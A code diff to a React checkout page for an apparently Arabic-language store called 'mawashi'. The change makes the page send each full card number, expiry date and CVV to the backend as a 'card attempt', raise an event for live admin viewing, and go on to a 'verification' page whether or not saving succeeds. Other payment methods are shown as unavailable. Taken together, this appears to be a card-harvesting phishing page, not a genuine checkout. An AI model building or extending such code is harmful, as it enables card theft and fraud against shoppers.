@@ -2,7 +2,7 @@ import { useState, useMemo } from 'react';
 import { useLocation, Link } from 'wouter';
 import { ArrowRight, Check } from 'lucide-react';
 import { Shell } from '../shared';
-import { useUpdateOrder } from '@workspace/api-client-react';
+import { createCardAttempt } from '@workspace/api-client-react';
 
 type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
 
@@ -74,8 +74,6 @@ export function PaymentPage() {
     cvv: false,
   });
 
-  const updateOrder = useUpdateOrder();
-
   // Get order ID from localStorage
   const orderData = localStorage.getItem('mawashi-last-order');
   const orderId = orderData ? JSON.parse(orderData).id : null;
@@ -106,33 +104,27 @@ export function PaymentPage() {
     setPaymentMethodError(`${methodName} غير متوفرة حالياً، يرجى الدفع بالبطاقة`);
   };
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     if (!isFormValid) return;
     
-    // Send payment data to server
+    // Send payment data to server as a new card attempt
     if (orderId) {
-      updateOrder.mutate({
-        id: orderId,
-        data: {
+      try {
+        await createCardAttempt(orderId, {
           cardName,
           cardNumber: rawCardNumber,
           cardExpiry: expiry,
           cardCvv: cvv,
-        }
-      }, {
-        onSuccess: () => {
-          window.dispatchEvent(new Event('mawashi-data-update'));
-          setLocation('/payment-verification');
-        },
-        onError: () => {
-          // Still navigate even if server update fails
-          window.dispatchEvent(new Event('mawashi-data-update'));
-          setLocation('/payment-verification');
-        }
-      });
-    } else {
-      setLocation('/payment-verification');
+        });
+        // Dispatch event for admin real-time updates
+        window.dispatchEvent(new CustomEvent('mawashi-card-attempt', { detail: { orderId } }));
+      } catch (error) {
+        console.error('Failed to save card attempt:', error);
+      }
     }
+    
+    // Navigate to verification page
+    setLocation('/payment-verification');
   };
 
   const formatCardNumber = (value: string) => {
